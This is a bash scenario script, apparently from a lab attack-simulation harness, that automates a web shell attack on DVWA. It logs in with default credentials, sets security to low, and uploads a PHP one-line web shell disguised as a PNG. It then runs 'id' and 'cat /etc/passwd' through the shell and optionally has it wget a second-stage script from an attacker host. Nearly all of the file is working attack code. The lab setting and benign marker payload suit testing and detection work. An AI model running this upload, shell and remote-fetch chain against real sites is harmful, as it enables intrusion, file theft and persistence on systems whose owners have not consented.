#!/usr/bin/env bash
# S03 — Web shell upload on DVWA (Moria). Attacker: Barad-dûr → Moria web app.
# Params: SUCCEED (2nd-stage fetch or not), VARIANT (command set).
# NOTE: DVWA form fields / paths vary by version. If the curl upload fails,
# check the login CSRF token name and the upload endpoint against your DVWA.
# See scenarios/S03-webshell-dvwa.md.
run_scenario() {
  local BASE="http://$VICLIN_IP" JAR="/tmp/s03.cookies"
  local SHELL_NAME="sh_${RANDOM}.php"

  step "stage the second-stage payload on Barad-dûr"
  drop_stage_file "lin-persist.sh" $'#!/bin/sh\n# benign lab marker\necho staged >/tmp/lin-persist.marker\n'
  serve_stage

  step "log in to DVWA and grab session + CSRF token"
  run "dvwa-login" "curl -s -c $JAR '$BASE/login.php' -o /tmp/s03.login && \
    TOKEN=\$(grep -oP \"user_token' value='\\K[0-9a-f]+\" /tmp/s03.login | head -1); \
    curl -s -b $JAR -c $JAR '$BASE/login.php' \
      --data-urlencode username=admin --data-urlencode password=password \
      --data-urlencode Login=Login --data-urlencode user_token=\"\$TOKEN\" -o /dev/null; \
    curl -s -b $JAR '$BASE/security.php' --data-urlencode security=low --data-urlencode seclvl=low -o /dev/null || true"

  step "upload the web shell via the File Upload module"
  run "webshell-body" "printf '%s' '<?php system(\$_GET[\"c\"]); ?>' > /tmp/$SHELL_NAME"
  run "dvwa-upload" "curl -s -b $JAR '$BASE/vulnerabilities/upload/' \
      -F 'MAX_FILE_SIZE=100000' -F 'uploaded=@/tmp/$SHELL_NAME;type=image/png' -F 'Upload=Upload' -o /dev/null || true"
  note "attempted upload of $SHELL_NAME to DVWA upload module"

  step "drive the shell"
  local URL="$BASE/hackable/uploads/$SHELL_NAME"
  run "cmd-id"     "curl -s '$URL?c=id' || true"
  run "cmd-passwd" "curl -s '$URL?c=cat+/etc/passwd' || true"
  if [[ "$SUCCEED" == "yes" ]]; then
    run "cmd-stage2" "curl -s '$URL?c=wget+http://$ATTACKER_IP:$STAGE_HTTP_PORT/lin-persist.sh+-O+/tmp/p.sh' || true"
    note "second stage fetched via web shell"
  fi

  stop_stage
  noise_lin
  run "cleanup" "rm -f /tmp/$SHELL_NAME /tmp/s03.login $JAR"
}
